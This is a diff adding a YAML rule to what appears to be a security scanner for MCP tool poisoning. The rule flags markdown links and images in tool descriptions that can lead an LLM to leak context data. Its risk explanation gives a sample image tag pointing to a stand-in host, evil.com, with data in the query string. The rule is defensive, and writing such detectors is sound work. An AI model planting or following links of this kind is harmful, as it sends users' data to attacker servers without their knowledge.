@@ -1,0 +1,31 @@
+check_id: tp017
+title: Markdown Link Injection in Descriptions
+category: tool_poisoning
+severity: medium
+description: >
+  Detects hidden markdown links in tool descriptions that can trigger
+  data exfiltration. Markdown image tags and links with encoded
+  parameters can cause the LLM to request external URLs, leaking context
+  data via query strings or path segments.
+risk_explanation: >
+  Markdown links in tool descriptions can exfiltrate data when the LLM
+  renders or follows them. An image tag like
+  ![img](https://evil.com/?data=...) can encode sensitive context in the
+  URL. The LLM may automatically resolve these links, sending user data
+  to attacker-controlled servers without any visible indication to the
+  user.
+remediation: >
+  Strip or neutralize markdown links and image references in tool
+  descriptions. Implement URL validation for any links that must be
+  retained. Block descriptions containing markdown image tags that
+  reference external domains. Use content security policies to prevent
+  automatic URL resolution from description content.
+references:
+  - "https://owasp.org/www-project-mcp-top-10/"
+owasp_mcp:
+  - "MCP02:2025"
+tags:
+  - tool_poisoning
+  - markdown_injection
+  - exfiltration
+  - link_injection
